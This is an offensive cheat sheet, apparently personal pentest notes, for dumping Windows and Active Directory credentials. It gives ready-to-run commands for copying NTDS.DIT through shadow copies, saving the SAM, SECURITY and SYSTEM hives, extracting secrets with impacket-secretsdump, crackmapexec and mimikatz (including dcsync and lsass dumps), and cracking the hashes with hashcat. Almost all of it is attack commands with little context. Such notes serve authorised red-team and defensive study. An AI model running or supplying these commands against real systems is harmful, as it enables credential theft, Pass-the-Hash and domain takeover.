# Secrets Dump
On DC you can retrieve NTDS.DIT file for domain users. hashes can be used for Pass The Hash attack (except cached hashes).

Requirements:
* Probably need administrator or SYSTEM or debug privileges

## Keys (SYSTEM)
`reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYSTEM`

## Domain hashes & kerberos keys (NTDS.DIT)
```
vssadmin create shadow /for=C:
copy <SHADOW_PATH>\Windows\NTDS\ntds.dit C:\Windows\Temp\NTDS
vssadmin delete shadows /shadow=<SHADOW_ID>
```
`impacket-secretsdump -ntds <NTDS> -system <SYSTEM> LOCAL`

`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --ntds`
Needs port 139 or 445 to be open

mimikatz # `lsadump::dcsync \all`

## Local hashes (SAM)
`reg SAVE HKLM\SAM C:\Windows\Temp\SAM`
`impacket-secretsdump -sam <SAM> -system <SYSTEM> LOCAL`

`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --sam`
Needs port 139 or 445 to be open

mimikatz # `token::elevate lsadump::sam /system:<SYSTEM> /SAM:<SAM>`
mimikatz # `token::elevate lsadump::sam`

## LSA secrets & cached domain hashes (SECURITY)
`reg SAVE HKLM\SECURITY C:\Windows\Temp\SECURITY`
`impacket-secretsdump -security <SECURITY> -system <SYSTEM> LOCAL`

`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --lsa`
Needs port 139 or 445 to be open

mimikatz # `token::elevate lsadump::lsa /patch`
mimikatz # `token::elevate lsadump::cache`

## Cached domain hashes (lsass process)
Needs port 139 or 445 to be open
`lsassy -d <DOMAIN> -u <USER> -p <PASS> <IP>`
`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> -M lsassy`

`procdump -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp`
mimikatz # `sekurlsa::minidump <DUMPFILE>`

mimikatz # `sekurlsa::logonPasswords`




`hashcat -m 1000 <HASH> <PASSLIST> --potfile-disable`
`hashcat -m 2100 <HASH> <PASSLIST> --potfile-disable`


`impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'`

crackmapexec